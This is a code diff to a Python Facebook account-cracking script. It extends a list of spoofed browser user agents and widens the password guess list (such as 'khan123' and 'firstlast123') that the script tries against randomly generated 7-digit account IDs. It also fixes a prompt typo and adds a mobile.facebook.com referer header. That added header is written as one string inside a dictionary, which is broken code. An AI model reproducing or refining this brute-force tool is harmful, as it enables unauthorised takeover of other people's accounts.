@@ -149,7 +149,8 @@ awan =[
 'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',]
+'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',]
 logo=("""\033[1;97m
    
   __  __        __  __            _        _ 
@@ -432,7 +433,7 @@ def random_number1():
 	print(logo)
 	print(' Example : 1000,5000,10000,****Etc')
 	linex()
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	limit = int(input('[+] Putt Your Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
@@ -555,7 +556,7 @@ def random_number4():
 	print(logo)
 	linex()
 	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	limit = int(input('[+] Putt Your Idz lemit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
@@ -569,7 +570,7 @@ def random_number4():
 		linex()
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode+guru,'khan786','khan44','khan12','khan1122']
+			pwx = [guru,kode+guru,'khan786','khan44','khan12','khan1122','khan123','khan12345','Khan123','Khan12345','firstlast','first last','firstlast123','firstlast12345']
 			yaari.submit(fcrack,uid,pwx,tl)
 	linex()
 	print('[✓] Crack process has been completed')
@@ -832,7 +833,7 @@ def fcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
-            
+            'referer: https://mobile.facebook.com/?zero_e=3&zero_et=1673125788&_rdc=1&_rdr&refsrc=deprecated',
             'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
